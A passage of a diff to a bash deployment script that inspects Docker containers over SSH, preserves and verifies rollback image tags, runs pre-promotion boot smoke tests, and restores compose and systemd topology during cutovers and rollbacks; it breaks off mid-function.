+    "cd ${remote_dir_q} && cid=\$(docker compose ${compose_files} ps -q api 2>/dev/null | head -1) && [ -n \"\$cid\" ] && docker inspect --format '{{.Image}}' \"\$cid\"")" || rc=$?
+  if ((rc != 0)) || [[ ! "${image_id}" =~ ^sha256:[a-f0-9]{64}$ ]]; then
+    warn "Could not resolve the running api image ID for ${env} (got: ${image_id:-empty})"
+    return 1
+  fi
+  printf '%s\n' "${image_id}"
+}
+
+# Return validated runtime-generation evidence for the compose-scoped api
+# service. Each non-empty record is:
+#   RUNTIME|container-id|image-id|state|compose-project|compose-service|config-hash
+# `ps -q` is authoritative for a live container; when it is empty, `ps -a -q`
+# is inspected so a stopped replacement can prove that this transaction reached
+# the candidate generation. ABSENT is a successful observation of no container,
+# not ownership evidence. Any transport, inspect, parse, or label failure is
+# unknown and returns non-zero so callers cannot compensate blindly.
+read_api_runtime_evidence() {
+  local env="$1" remote_dir compose_files remote_dir_q timeout output rc=0
+  local record kind container_id image_id state compose_project compose_service config_hash extra
+  local normalized="" next_project
+  remote_dir="$(env_to_remote_dir "${env}")" || return 1
+  compose_files="$(env_to_compose_files "${env}")" || return 1
+  next_project="acx-${env}-next"
+  remote_dir_q="$(remote_quote "${remote_dir}")"
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  # shellcheck disable=SC2086 # compose_files is intentionally word-split remotely.
+  if is_aura_env "$env"; then
+    output="$(run_with_deadline "$timeout" "Aura canonical and next generation inspection for $env" \
+      ssh -o BatchMode=yes -o ConnectTimeout=5 -o ConnectionAttempts=1 \
+      -l "$OCI_USER" -- "$OCI_HOST" \
+      "cd ${remote_dir_q} && \
+       fmt='RUNTIME|{{.Id}}|{{.Image}}|{{.State.Status}}|{{index .Config.Labels \"com.docker.compose.project\"}}|{{index .Config.Labels \"com.docker.compose.service\"}}|{{index .Config.Labels \"com.docker.compose.config-hash\"}}'; \
+       found=0; \
+       for project in acx-${env} acx-${env}-next; do \
+         ids=\$(docker ps -a --filter \"label=com.docker.compose.project=\$project\" --filter label=com.docker.compose.service=api --format '{{.ID}}') || exit 41; \
+         for cid in \$ids; do \
+           docker inspect --format \"\$fmt\" \"\$cid\" || exit 42; found=1; \
+         done; \
+       done; \
+       [ \"\$found\" = 1 ] || printf '%s\\n' ABSENT")" || rc=$?
+  else
+    output="$(run_with_deadline "${timeout}" "api runtime-generation inspection for ${env}" \
+      ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "cd ${remote_dir_q} && \
+       inspect_fmt='RUNTIME|{{.Id}}|{{.Image}}|{{.State.Status}}|{{index .Config.Labels \"com.docker.compose.project\"}}|{{index .Config.Labels \"com.docker.compose.service\"}}|{{index .Config.Labels \"com.docker.compose.config-hash\"}}'; \
+       emit_api_records() { \
+         running_ids=\$(docker compose \"\$@\" ps -q api 2>/dev/null) || return 41; \
+         running_cid=\$(printf '%s\\n' \"\$running_ids\" | sed -n '1p'); \
+         if [ -n \"\$running_cid\" ]; then \
+           docker inspect --format \"\$inspect_fmt\" \"\$running_cid\" || return 42; \
+           return 0; \
+         fi; \
+         stopped_ids=\$(docker compose \"\$@\" ps -a -q api 2>/dev/null) || return 43; \
+         if [ -z \"\$stopped_ids\" ]; then \
+           return 0; \
+         fi; \
+         for stopped_cid in \$stopped_ids; do \
+           docker inspect --format \"\$inspect_fmt\" \"\$stopped_cid\" || return 44; \
+         done; \
+       }; \
+       canonical_out=\$(emit_api_records ${compose_files}) || exit \$?; \
+       next_out=; \
+       if [ -f docker-compose.cutover.yml ]; then \
+         next_out=\$(emit_api_records -p ${next_project} -f docker-compose.cutover.yml) || exit \$?; \
+       fi; \
+       if [ -z \"\$canonical_out\" ] && [ -z \"\$next_out\" ]; then \
+         printf '%s\\n' ABSENT; \
+       else \
+         [ -z \"\$canonical_out\" ] || printf '%s\\n' \"\$canonical_out\"; \
+         [ -z \"\$next_out\" ] || printf '%s\\n' \"\$next_out\"; \
+       fi")" || rc=$?
+  fi
+  if ((rc != 0)); then
+    return "${rc}"
+  fi
+  if [[ "${output}" == "ABSENT" ]]; then
+    printf '%s\n' "ABSENT"
+    return 0
+  fi
+  [[ -n "${output}" ]] || return 1
+  while IFS='|' read -r record container_id image_id state compose_project compose_service config_hash extra; do
+    [[ "${record}" == "RUNTIME" && -z "${extra}" ]] || return 1
+    [[ "${container_id}" =~ ^[a-f0-9]{12,64}$ ]] || return 1
+    [[ "${image_id}" =~ ^sha256:[a-f0-9]{64}$ ]] || return 1
+    [[ "${state}" =~ ^(running|restarting|created|exited|dead)$ ]] || return 1
+    [[ "${compose_project}" =~ ^[A-Za-z0-9_.-]+$ ]] || return 1
+    if is_aura_env "$env"; then
+      [[ "$compose_project" == "acx-$env" || "$compose_project" == "acx-$env-next" ]] || return 1
+    fi
+    [[ "${compose_service}" == "api" ]] || return 1
+    [[ "${config_hash}" =~ ^[A-Za-z0-9_.:-]+$ ]] || return 1
+    case "${state}" in
+      running | restarting) kind="RUNNING" ;;
+      created | exited | dead) kind="STOPPED" ;;
+    esac
+    normalized+="${kind}|${container_id}|${image_id}|${state}|${compose_project}|${compose_service}|${config_hash}"$'\n'
+  done <<<"${output}"
+  [[ -n "${normalized}" ]] || return 1
+  printf '%s' "${normalized}"
+}
+
+# Snapshot the compose-scoped runtime generation before a deployment or manual
+# rollback changes the registry/runtime relationship. The identity is the exact
+# probe record (container ID, immutable image ID, state, project, service, and
+# config hash), not a caller-supplied or reconstructed container reference.
+#
+# Automatic deploys capture a RUNNING prior container whose image was already
+# verified by preserve_rollback_tag. Manual rollback also permits a STOPPED
+# observation because the rendered canonical unit's ExecStop is scoped to
+# api+worker; an operator may be recovering that stopped prior generation after
+# a failed replacement create.
+capture_prior_runtime_identity() {
+  local env="$1" expected_image_ids="${2:-}" allow_stopped="${3:-0}"
+  local evidence runtime_kind runtime_cid runtime_image_id runtime_state
+  local runtime_project runtime_service runtime_hash runtime_extra selected=""
+  ACX_PRIOR_RUNTIME_IDENTITY=""
+  if ! evidence="$(read_api_runtime_evidence "${env}")"; then
+    return 1
+  fi
+  [[ "${evidence}" != "ABSENT" ]] || return 1
+  while IFS='|' read -r runtime_kind runtime_cid runtime_image_id runtime_state \
+    runtime_project runtime_service runtime_hash runtime_extra; do
+    [[ "${runtime_kind}" == "RUNNING" || "${runtime_kind}" == "STOPPED" ]] || continue
+    [[ -z "${runtime_extra}" ]] || return 1
+    [[ "${runtime_project}" == "acx-${env}" && "${runtime_service}" == "api" ]] || continue
+    [[ -n "${runtime_hash}" ]] || continue
+    [[ "${allow_stopped}" == "1" || "${runtime_kind}" == "RUNNING" ]] || continue
+    if [[ -n "${expected_image_ids}" ]]; then
+      case ",${expected_image_ids}," in
+        *,"${runtime_image_id}",*) ;;
+        *) continue ;;
+      esac
+    fi
+    [[ -z "${selected}" ]] || return 1
+    selected="${runtime_kind}|${runtime_cid}|${runtime_image_id}|${runtime_state}|${runtime_project}|${runtime_service}|${runtime_hash}"
+  done <<<"${evidence}"
+  [[ -n "${selected}" ]] || return 1
+  ACX_PRIOR_RUNTIME_IDENTITY="${selected}"
+}
+
+# Capture the image actually serving on the target by immutable image ID before
+# a build can overwrite any host-local tag, then publish rollback-<digest-prefix>
+# in that image's repository. Prod fails closed when preservation fails; lower
+# environments emit a loud warning.
+preserve_rollback_tag() {
+  local env="$1" running_image_id running_image_ref running_base inspect_output prev_digest prev_base prev_id rollback_ref resolved_id timeout rc=0
+  local inspect_timeout runtime_evidence strict=0
+  timeout="${ACX_PUSH_TIMEOUT:-900}"
+  inspect_timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_PUSH_TIMEOUT must be a positive integer (got: ${timeout})"
+  fi
+  # Production-tier and Aura targets never collapse unknown runtime state into success.
+  if is_prod_tier_env "${env}" || is_aura_env "${env}"; then
+    strict=1
+  fi
+  if is_aura_env "${env}"; then
+    # Only a decoded ABSENT (no canonical or next api generation) admits a first
+    # bootstrap. Transport, inspect, parse, or label failures are UNKNOWN.
+    runtime_evidence="$(read_api_runtime_evidence "${env}")" ||
+      fail "Aura runtime state for ${env} is UNKNOWN (inspection failed); refusing bootstrap and rollback preservation"
+    if [[ "${runtime_evidence}" == "ABSENT" ]]; then
+      log "Decoded ABSENT: no prior ${env} api generation; no rollback target to preserve"
+      return 0
+    fi
+  fi
+  if ! running_image_id="$(read_running_api_image_id "${env}")"; then
+    if ((strict)); then
+      fail "Cannot identify the image actually serving prod; refusing deployment before build/restart"
+    fi
+    warn "ROLLBACK NOT PRESERVED: no running api image found (first ${env} deploy?)"
+    return 0
+  fi
+  if ! running_image_ref="$(read_running_api_image "${env}")" ||
+    [[ ! "${running_image_ref}" =~ ^[A-Za-z0-9_.:/@-]+$ ]]; then
+    if ((strict)); then
+      fail "Cannot identify the repository configured by the running prod container"
+    fi
+    warn "ROLLBACK NOT PRESERVED: running image reference is unavailable or malformed"
+    return 0
+  fi
+  if [[ "${running_image_ref}" == *@sha256:* ]]; then
+    running_base="${running_image_ref%@sha256:*}"
+  elif [[ "${running_image_ref##*/}" == *:* ]]; then
+    running_base="${running_image_ref%:*}"
+  else
+    running_base="${running_image_ref}"
+  fi
+  assert_safe_image_repo "running image repository" "${running_base}"
+  inspect_output="$(run_with_deadline "${inspect_timeout}" "rollback provenance inspection for ${env}" \
+    remote_docker_with_config image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' \
+    "${running_image_id}")" || rc=$?
+  prev_digest="$(printf '%s\n' "${inspect_output}" | awk -v repo="${running_base}@sha256:" 'index($0, repo) == 1 { print; exit }')"
+  if ((rc != 0)) || [[ ! "${prev_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    if ((strict)); then
+      fail "Cannot resolve the running prod image to a registry digest; rollback preservation is mandatory"
+    fi
+    warn "ROLLBACK NOT PRESERVED: running image ${running_image_id} has no verified registry digest"
+    return 0
+  fi
+  prev_base="${prev_digest%@sha256:*}"
+  assert_safe_image_repo "rollback image repository" "${prev_base}"
+  prev_id="${prev_digest##*:}"
+  prev_id="${prev_id:0:12}"
+  rollback_ref="${prev_base}:rollback-${prev_id}"
+  if ! run_with_deadline "${inspect_timeout}" "rollback preservation retag for ${env}" \
+    remote_docker_with_config tag "${running_image_id}" "${rollback_ref}"; then
+    if ((strict)); then
+      fail "Could not tag the running prod image for rollback"
+    fi
+    warn "ROLLBACK NOT PRESERVED: could not tag ${running_image_id} as ${rollback_ref}"
+    return 0
+  fi
+  if ! run_with_deadline "${timeout}" "push of ${rollback_ref}" remote_docker_with_config push "${rollback_ref}"; then
+    if ((strict)); then
+      fail "Could not publish mandatory prod rollback tag ${rollback_ref}"
+    fi
+    warn "ROLLBACK NOT PRESERVED: could not publish ${rollback_ref}"
+    return 0
+  fi
+  # A successful push is not enough for a recovery artifact: pull the registry
+  # tag back and prove it resolves to the exact image ID serving this target.
+  if ! _pull_ref_remote "${rollback_ref}" >/dev/null ||
+    ! resolved_id="$(remote_image_id_for_digest "${prev_digest}")" ||
+    [[ "${resolved_id}" != "${running_image_id}" ]]; then
+    if ((strict)); then
+      fail "Published rollback tag ${rollback_ref} did not resolve to the running prod image"
+    fi
+    warn "ROLLBACK NOT PRESERVED: ${rollback_ref} did not resolve to ${running_image_id}"
+    return 0
+  fi
+  ACX_ROLLBACK_DIGEST_REF="${prev_digest}"
+  ACX_ROLLBACK_IMAGE_BASE="${prev_base}"
+  ACX_ROLLBACK_TAG="rollback-${prev_id}"
+  ACX_PRIOR_IMAGE_ID="${running_image_id}"
+  log "Preserved registry rollback ${rollback_ref} -> ${prev_digest}"
+}
+
+#---------------------------------------------------------------- boot smoke
+# Pre-promote boot smoke: boot the freshly-built :SHA in a throwaway container on
+# the VM *before* :latest is promoted/restarted, so a bad image (missing package,
+# import error, failed real boot chain) aborts the deploy with prod still serving
+# the old image. Returns non-zero on any smoke failure.
+# Two gates: (1) network-free import smoke; (2) full image CMD (docker-entrypoint.sh)
+# with the same /data/cache + RECOGNITION_BLOB_ROOT mounts the deployed stack uses,
+# so smoke observes entrypoint + /app/.image-variant + VLM cache gates (D4).
+do_boot_smoke() {
+  local env="$1" image="$2" remote_dir smoke_timeout poll_interval smoke_rc=0
+  local smoke_payload="${SCRIPT_DIR}/lib/recognition-boot-smoke.sh"
+  local pg_ready_budget setup_slack composite_deadline
+  local net_create_cap port_cap trap_docker_s smoke_margin
+  local kill_grace trap_op_s trap_op_count trap_wall setup_kill_grace
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  if [[ ! "${image}" =~ ^${IMAGE_BASE}@sha256:[a-f0-9]{64}$ ]]; then
+    warn "boot smoke refused non-digest candidate: ${image}"
+    return 1
+  fi
+  if [[ ! -r "${smoke_payload}" || ! -s "${smoke_payload}" ]]; then
+    warn "boot smoke payload unavailable: ${smoke_payload}"
+    return 1
+  fi
+  # Image-aware health budget: recognition default 24s; VLM uses the unmeasured
+  # longer default. ACX_SMOKE_TIMEOUT overrides either, validated as a positive
+  # integer. Postgres ready-wait is a separate budget (SMOKE_PG_READY_TIMEOUT).
+  # Inner caps live here once; wrapper deadline and the remote body share them
+  # as positionals so the outer run_with_deadline cannot fire first (H2E-01).
+  smoke_timeout="$(resolve_smoke_timeout)"
+  poll_interval=2
+  pg_ready_budget="${SMOKE_PG_READY_TIMEOUT}"
+  setup_slack="${SMOKE_SETUP_SLACK}"
+  net_create_cap=10
+  port_cap=5
+  trap_docker_s=10
+  smoke_margin=5
+  # GR-262: timeout -k 1 makes a hung docker child last secs+1. Failure EXIT
+  # trap runs 6 sequential _smoke_timeout 2 ops (logs, rm api, rm pg, volume,
+  # inspect, network rm). Four setup caps have the same kill-grace.
+  kill_grace=1
+  trap_op_s=2
+  trap_op_count=6
+  trap_wall=$((trap_op_count * (trap_op_s + kill_grace)))
+  setup_kill_grace=$((4 * kill_grace))
+  composite_deadline=$((net_create_cap + setup_slack + pg_ready_budget + setup_slack + port_cap + smoke_timeout + trap_wall + poll_interval + smoke_margin + setup_kill_grace))
+  log "Pre-promote boot smoke: ${image} on ${SSH_TARGET} (env=${env}, health_budget=${smoke_timeout}s, pg_ready_budget=${pg_ready_budget}s, real entrypoint)"
+  # A local build authenticated the workstation for its push, not the VM. The
+  # smoke pull is a separate remote process and needs the remote half of this
+  # deploy's credential config before it can materialise the candidate.
+  preflight_remote_ocir_auth
+  # S2-A-09: VLM/local-build path still pulls layers onto the VM here — consult
+  # free-space floor before docker pull (same OPS-1 guard as remote build).
+  assert_remote_disk_headroom_for_pull
+  # Gate 1 — network-free import smoke. Catches the ModuleNotFoundError-class
+  # packaging omissions (the scene/ incident) without touching the DB.
+  # RECOGNITION_RUNTIME_MODE=development so the production load-time secret
+  # fail-fast (validate_required_secrets / validate_oci_vault_boot) no-ops — this
+  # gate proves the image IMPORTS, not that prod secrets are configured (that is
+  # Gate 2, which uses the deployed .env + real entrypoint).
+  if ! _pull_ref_remote "${image}" >/dev/null ||
+    [[ "$(remote_image_digest_ref "${image}" || true)" != "${image}" ]] ||
+    ! run_with_deadline "${smoke_timeout}" "boot-smoke import gate for ${image}" \
+      ssh -n -o BatchMode=yes -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "docker run --rm -e RECOGNITION_RUNTIME_MODE=development --entrypoint python ${image} -c 'import api.main'"; then
+    warn "boot smoke: 'import api.main' failed on ${image} (packaging/import error)"
+    return 1
+  fi
+  # Gate 2 — real image CMD (scripts/docker-entrypoint.sh): migrate + schema verify
+  # + optional VLM cache verify + uvicorn. Mounts match docker-compose.env.yml:
+  #   ACX_MODELS_PATH → /data/cache:ro
+  #   RECOGNITION_BLOB_ROOT=/var/lib/acx-blobs (ephemeral volume for smoke)
+  # Network name is read (not sourced) from the deployed .env.
+  # DB target is an ephemeral Postgres started for this smoke only — never the
+  # env-file / Vault prod DSN (H2 / INT-01). Real entrypoint stays (D4).
+  # Health budget is ACX_SMOKE_TIMEOUT; Postgres ready-wait is added to the
+  # outer wall-clock so pg_isready cannot steal the /health deadline.
+  local vlm_budget=0
+  if is_vlm_smoke_budget && [[ -z "${ACX_SMOKE_TIMEOUT:-}" ]]; then
+    vlm_budget=1
+  fi
+  # Pull pgvector outside the smoke body so image fetch cannot consume pg/health budgets.
+  if ! run_with_deadline "$(validated_deadline ACX_PULL_TIMEOUT 900)" "boot-smoke pgvector pull for ${image}" \
+    ssh -n -o BatchMode=yes -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "docker pull pgvector/pgvector:pg17"; then
+    warn "boot smoke: pre-pull of pgvector/pgvector:pg17 failed on ${SSH_TARGET}"
+    return 1
+  fi
+  run_with_deadline "${composite_deadline}" "boot-smoke health gate for ${image}" \
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "bash -s ${env} ${image} ${remote_dir} ${smoke_timeout} ${poll_interval} ${vlm_budget} ${pg_ready_budget} ${setup_slack} ${net_create_cap} ${port_cap} ${trap_docker_s}" <<SMOKE_WRAP || smoke_rc=$?
+$(declare -f sanitize_deploy_diagnostic)
+$(<"${smoke_payload}")
+SMOKE_WRAP
+  if ((smoke_rc != 0)); then
+    if ((smoke_rc == 124)); then
+      warn "boot smoke: phase unknown for ${image} after composite deadline ${composite_deadline}s"
+    elif [[ "${vlm_budget}" == "1" ]]; then
+      warn "boot smoke: /health never came up for ${image} after ${smoke_timeout}s (VLM budget is an UNVALIDATED default — set ACX_SMOKE_TIMEOUT=<seconds> to raise it)"
+    else
+      warn "boot smoke: /health never came up for ${image} after ${smoke_timeout}s"
+    fi
+    return 1
+  fi
+  log "Boot smoke passed for ${image}"
+}
+
+# One-shot acx_blobs ownership repair for volumes created under root before USER acx
+# (ORCH-LAUNCH-01-REV-r0811af90-S1-A-02). Docker only propagates image-path ownership
+# when initialising an empty new volume — existing root:root named volumes stay root
+# forever and every multipart upload 500s with EACCES. Compose defines a
+# profiles:[repair] fix-blob-ownership service.
+# W8-VER-03: probe volume-root ownership first; skip the O(blobs) recursive chown
+# when the root is already acx-owned (migration is one-shot after the first repair).
+repair_blob_volume_ownership() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1"
+  local remote_dir compose_files timeout
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  compose_files="$(env_to_compose_files "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  log "Repairing acx_blobs ownership on ${env} (probe-then-chown; fix-blob-ownership profile)"
+  # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
+  # Probe runs as root via the repair profile image; uid 10001 is the Dockerfile acx user.
+  if ! recognition_edge_command "cd '${remote_dir}' && docker compose ${compose_files} --profile repair run --rm --entrypoint sh fix-blob-ownership -c '
+      root=/var/lib/acx-blobs
+      uid=\$(stat -c %u \"\$root\" 2>/dev/null || echo unknown)
+      if [ \"\$uid\" = \"10001\" ]; then
+        echo \"acx_blobs root already uid=10001; skip recursive chown\"
+        exit 0
+      fi
+      echo \"acx_blobs root uid=\$uid; running recursive chown acx:acx\"
+      chown -R acx:acx \"\$root\"
+    '"; then
+    warn "acx_blobs ownership repair failed on ${env}; multipart uploads will EACCES under USER acx. Run: cd ${remote_dir} && docker compose ${compose_files} --profile repair run --rm fix-blob-ownership"
+    return 1
+  fi
+}
+
+verify_running_image_digest() {
+  local env="$1" expected_digest="$2" running_image_id expected_image_id
+  running_image_id="$(read_running_api_image_id "${env}" || true)"
+  expected_image_id="$(remote_image_id_for_digest "${expected_digest}" || true)"
+  if [[ -z "${running_image_id}" || "${running_image_id}" != "${expected_image_id}" ]]; then
+    warn "IMMUTABLE IMAGE MISMATCH: ${env} serves ${running_image_id:-unknown}, expected ${expected_image_id:-unknown} from ${expected_digest}"
+    return 1
+  fi
+}
+
+verify_restored_runtime() {
+  local env="$1" expected_digest="$2" url attempt max_attempts sleep_s body budget
+  url="$(env_to_health_url "${env}")" || return 1
+  if ! budget="$(probe_budget ACX_ROLLBACK_VERIFY 5 5)"; then
+    return 1
+  fi
+  read -r max_attempts sleep_s <<<"${budget}"
+  log "Rollback verify budget: ${max_attempts}x${sleep_s}s (ACX_ROLLBACK_VERIFY_*)"
+  for attempt in $(seq 1 "${max_attempts}"); do
+    if body="$(curl --fail --silent --show-error --max-time 10 "${url}" 2>&1)" &&
+      verify_running_image_digest "${env}" "${expected_digest}"; then
+      log "Rollback verified healthy: ${env} serves ${expected_digest}"
+      return 0
+    fi
+    warn "Rollback health/digest verification failed on attempt ${attempt}/${max_attempts}"
+    if ! printf '%s\n' "${body:-no health response}" | sanitize_deploy_diagnostic >&2; then
+      echo "diagnostic: rollback health body unavailable" >&2
+    fi
+    verify_retry_sleep "${attempt}" "${max_attempts}" "${sleep_s}"
+  done
+  return 1
+}
+
+restore_topology_backups() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" remote_dir unit timeout restore_current_only=0
+  if [[ "${2:-}" == "current-only" ]]; then
+    restore_current_only=1
+  fi
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  unit="$(env_to_unit "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  log "Restoring compose/unit topology for ${env} from the verified transaction snapshot"
+  recognition_edge_command "set -euo pipefail
+     backup_root='${ACX_DEPLOY_BACKUP_ROOT}'
+     transaction_dir=\"\$backup_root/${env}/${ACX_DEPLOY_TRANSACTION_ID}\"
+     latest_file=\"\$backup_root/${env}/latest\"
+     topology_dir=\"\$transaction_dir\"
+     legacy=0
+     restore_current_only='${restore_current_only}'
+     if [ "\$restore_current_only" = 1 ] && sudo test -f "\$topology_dir/topology.pending" && ! sudo test -f "\$topology_dir/topology.ready"; then
+       echo 'topology snapshot is incomplete; refusing restore without a complete transaction snapshot' >&2
+       exit 1
+     fi
+     if [ "\$restore_current_only" = 1 ] && ! sudo test -f "\$topology_dir/topology.ready"; then
+       echo 'no current-transaction topology snapshot; topology left untouched'
+       exit 0
+     fi
+     if sudo test -f \"\$topology_dir/topology.pending\" && ! sudo test -f \"\$topology_dir/topology.ready\"; then
+       echo 'topology snapshot is incomplete; refusing restore without a complete transaction snapshot' >&2
+       exit 1
+     fi
+     if ! sudo test -f \"\$topology_dir/topology.ready\" && sudo test -f \"\$topology_dir/edge-cutover.ready\"; then
+       topology_dir=
+     elif ! sudo test -f \"\$topology_dir/topology.ready\" && sudo test -f \"\$latest_file\"; then
+       latest_dir=\$(sudo cat \"\$latest_file\")
+       case \"\$latest_dir\" in
+         \"\$backup_root/${env}/\"*) topology_dir=\"\$latest_dir\" ;;
+         *) echo 'invalid topology snapshot pointer' >&2; exit 1 ;;
+       esac
+     elif ! sudo test -f \"\$topology_dir/topology.ready\"; then
+       topology_dir=
+       if sudo test -f '${remote_dir}/docker-compose.env.yml.bak' \
+         || sudo test -f '${remote_dir}/docker-compose.env.yml.bak.absent' \
+         || sudo test -f '/etc/systemd/system/${unit}.service.bak' \
+         || sudo test -f '/etc/systemd/system/${unit}.service.bak.absent'; then
+         legacy=1
+       fi
+     fi
+     restore_one() {
+       live=\"\$1\"; snapshot=\"\$2\"; absent=\"\$3\"
+       if sudo test -f \"\$snapshot\"; then
+         sudo cp -p -- \"\$snapshot\" \"\$live\"
+         sudo cmp -s -- \"\$snapshot\" \"\$live\" || { echo \"restored topology verification failed: \$live\" >&2; return 1; }
+         echo \"restored:\$live\"
+       elif sudo test -f \"\$absent\"; then
+         sudo rm -f -- \"\$live\"
+         sudo test ! -e \"\$live\" || { echo \"prior-absence topology restore failed: \$live\" >&2; return 1; }
+         echo \"removed-prior-file:\$live\"
+       else
+         echo \"missing verified topology snapshot or prior-absence marker: \$live\" >&2
+         return 1
+       fi
+     }
+     if [ -n \"\$topology_dir\" ]; then
+       restore_one '${remote_dir}/docker-compose.env.yml' \"\$topology_dir/docker-compose.env.yml\" \"\$topology_dir/docker-compose.env.yml.absent\"
+       restore_one '/etc/systemd/system/${unit}.service' \"\$topology_dir/${unit}.service\" \"\$topology_dir/${unit}.service.absent\"
+       if [ '${env}' = prod ]; then
+         restore_one '${remote_dir}/docker-compose.admin.yml' \"\$topology_dir/docker-compose.admin.yml\" \"\$topology_dir/docker-compose.admin.yml.absent\"
+       fi
+       if sudo test -f \"\$topology_dir/db-init.ready\"; then
+         restore_one '${remote_dir}/db/docker-prod-init/001-extensions.sql' \"\$topology_dir/db-init/001-extensions.sql\" \"\$topology_dir/db-init/001-extensions.sql.absent\"
+       fi
+     elif [ \"\$legacy\" = 1 ]; then
+       restore_one '${remote_dir}/docker-compose.env.yml' '${remote_dir}/docker-compose.env.yml.bak' '${remote_dir}/docker-compose.env.yml.bak.absent'
+       restore_one '/etc/systemd/system/${unit}.service' '/etc/systemd/system/${unit}.service.bak' '/etc/systemd/system/${unit}.service.bak.absent'
+       if [ '${env}' = prod ]; then
+         restore_one '${remote_dir}/docker-compose.admin.yml' '${remote_dir}/docker-compose.admin.yml.bak' '${remote_dir}/docker-compose.admin.yml.bak.absent'
+       fi
+     else
+       echo 'no topology mutation snapshot recorded; leaving compose and unit files unchanged'
+       exit 0
+     fi
+     sudo systemctl daemon-reload"
+}
+
+restore_edge_backups() {
+  local env="$1" mode="${2:-}"
+  recognition_edge_begin "$env" || return $?
+  recognition_edge_remote restore "$env" "$mode" || return $?
+  ACX_TRAFFIC_FLIPPED=0
+}
+
+recreate_cutover_candidate() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" next_unit next_project remote_dir timeout
+  next_unit="$(env_to_next_unit "$env")" || return 1
+  next_project="acx-${env}-next"
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  log "Force-stopping and recreating cutover candidate ${next_unit}"
+  if ! recognition_edge_command "set -euo pipefail
+     sudo systemctl stop $(remote_quote "${next_unit}")
+     cd $(remote_quote "${remote_dir}")
+     docker compose -p $(remote_quote "${next_project}") -f docker-compose.cutover.yml rm -fs api
+     sudo systemctl start $(remote_quote "${next_unit}")"; then
+    warn "could not force-stop and recreate cutover candidate ${next_unit}"
+    return 1
+  fi
+}
+
+abort_cutover_candidate() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" next_unit next_project remote_dir timeout
+  next_unit="$(env_to_next_unit "$env")" || return 1
+  next_project="acx-${env}-next"
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  log "Draining cutover candidate ${next_unit}"
+  if ! recognition_edge_command "set -euo pipefail
+     if stop_out=\"\$(sudo systemctl stop $(remote_quote "${next_unit}") 2>&1)\"; then
+       [ -z \"\${stop_out}\" ] || printf '%s\n' \"\${stop_out}\" >&2
+     else
+       stop_rc=\$?
+       # Failed stop is not confirmed absence (MCP10415). Query explicit
+       # unit state; only LoadState=not-found ActiveState=inactive
+       # SubState=dead licenses cleanup. TEST-15 / RLSE-03 / RES-03.
+       show_out=\"\$(sudo systemctl show $(remote_quote "${next_unit}.service") --property=LoadState --property=ActiveState --property=SubState --no-pager)\" || {
+         show_rc=\$?
+         printf '%s\n' \"\${stop_out}\" >&2
+         exit \"\${show_rc}\"
+       }
+       parse_rc=0
+       (
+       load_state=
+       active_state=
+       sub_state=
+       while IFS= read -r line || [ -n \"\${line}\" ]; do
+         [ -z \"\${line}\" ] && continue
+         case \"\${line}\" in
+           LoadState=*)
+             [ -n \"\${load_state}\" ] && exit 2
+             load_state=\${line#LoadState=}
+             ;;
+           ActiveState=*)
+             [ -n \"\${active_state}\" ] && exit 2
+             active_state=\${line#ActiveState=}
+             ;;
+           SubState=*)
+             [ -n \"\${sub_state}\" ] && exit 2
+             sub_state=\${line#SubState=}
+             ;;
+           *)
+             exit 2
+             ;;
+         esac
+       done <<< \"\${show_out}\"
+       [ \"\${load_state}\" = not-found ] && [ \"\${active_state}\" = inactive ] && [ \"\${sub_state}\" = dead ] || exit \"\${stop_rc}\"
+       ) || parse_rc=\$?
+       if [ \"\${parse_rc}\" -ne 0 ]; then
+         printf '%s\n' \"\${stop_out}\" >&2
+         exit \"\${parse_rc}\"
+       fi
+     fi
+     if sudo systemctl is-enabled $(remote_quote "${next_unit}") >/dev/null 2>&1; then
+       sudo systemctl disable $(remote_quote "${next_unit}")
+     fi
+     sudo rm -f '/etc/systemd/system/${next_unit}.service'
+     sudo systemctl daemon-reload
+     cd $(remote_quote "${remote_dir}") && docker compose -p $(remote_quote "${next_project}") -f docker-compose.cutover.yml rm -fs api"; then
+    warn "cutover candidate drain failed for ${env}; refusing to report a clean cutover"
+    return 1
+  fi
+  ACX_TRAFFIC_FLIPPED=0
+  return 0
+}
+
+enable_cutover_candidate() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" next_unit timeout
+  next_unit="$(env_to_next_unit "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  log "Enabling cutover candidate ${next_unit} until canonical routing is committed"
+  recognition_edge_command "sudo systemctl enable $(remote_quote "${next_unit}")"
+}
+
+cutover_inflight_present() {
+  local env="$1" timeout inflight output rc=0
+  env_to_unit "${env}" >/dev/null
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  inflight="${ACX_DEPLOY_BACKUP_ROOT}/${env}/cutover-inflight"
+  # lstat distinguishes true ENOENT from inaccessible/nonregular state and
+  # never follows a marker symlink. Only a successful envelope licenses absence.
+  output="$(
